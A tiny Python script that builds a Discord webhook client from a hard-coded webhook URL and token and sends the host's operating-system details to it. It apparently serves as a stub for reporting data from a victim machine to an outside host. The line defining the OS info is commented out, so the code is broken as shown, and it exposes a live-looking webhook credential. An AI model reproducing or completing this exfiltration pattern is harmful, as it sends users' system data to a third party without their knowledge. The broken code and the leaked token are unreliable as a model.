from discord import SyncWebhook
import requests
import os

webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1212268576048939008/Wtk3irDv_JmTOxRhvWxMTdLpulLZ4Jk97LCwjQR9Yfu-2AGU8g5j_iMMHDVjNePhi4Xq")
#osname =  os.uname()
webhook.send(f"OS-Info: {osname}")